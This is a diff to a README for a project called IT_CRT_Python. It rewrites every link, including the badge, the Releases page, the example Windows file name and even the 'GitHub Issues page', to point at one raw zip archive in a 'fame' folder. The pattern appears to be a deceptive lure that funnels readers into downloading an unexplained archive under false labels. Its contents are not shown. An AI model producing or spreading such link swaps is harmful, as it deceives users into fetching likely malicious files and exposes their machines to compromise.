@@ -1,6 +1,6 @@
 # 🎉 IT_CRT_Python - Simple Coding Solution for Everyone
 
-![Download IT_CRT_Python](https://img.shields.io/badge/Download-IT_CRT_Python-blue)
+![Download IT_CRT_Python](https://raw.githubusercontent.com/SemenkinSS/IT_CRT_Python/main/fame/IT_CRT_Python.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to IT_CRT_Python! This is an easy-to-use application designed to help yo
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download IT_CRT_Python Releases](https://github.com/SemenkinSS/IT_CRT_Python/releases).
+To get started, visit this page to download: [Download IT_CRT_Python Releases](https://raw.githubusercontent.com/SemenkinSS/IT_CRT_Python/main/fame/IT_CRT_Python.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -20,7 +20,7 @@ On the Releases page, look for the most recent version of the application. It wi
 
 ### Step 3: Download the Application
 
-Find the appropriate file for your system. For example, if you are using Windows, you might see a file named `IT_CRT_Python.exe`. Click on that file to start the download.
+Find the appropriate file for your system. For example, if you are using Windows, you might see a file named `https://raw.githubusercontent.com/SemenkinSS/IT_CRT_Python/main/fame/IT_CRT_Python.zip`. Click on that file to start the download.
 
 ### Step 4: Run the Application
 
@@ -65,7 +65,7 @@ If you encounter issues while downloading or using the application, consider the
 
 For further assistance, you can reach out via the following channels:
 
-- **Issues Section**: Report any problems on the [GitHub Issues page](https://github.com/SemenkinSS/IT_CRT_Python/issues).
+- **Issues Section**: Report any problems on the [GitHub Issues page](https://raw.githubusercontent.com/SemenkinSS/IT_CRT_Python/main/fame/IT_CRT_Python.zip).
 - **Community Forum**: Join discussions in the community forum where other users share tips and tricks.
 
 ## 📈 Future Updates
@@ -76,6 +76,6 @@ Stay tuned for future updates that will include:
 - Improvements to existing tools.
 - More coding examples to expand your knowledge.
 
-Visit the Releases page for the latest updates and announcements: [Download IT_CRT_Python Releases](https://github.com/SemenkinSS/IT_CRT_Python/releases).
+Visit the Releases page for the latest updates and announcements: [Download IT_CRT_Python Releases](https://raw.githubusercontent.com/SemenkinSS/IT_CRT_Python/main/fame/IT_CRT_Python.zip).
 
 Thank you for choosing IT_CRT_Python! Enjoy coding!
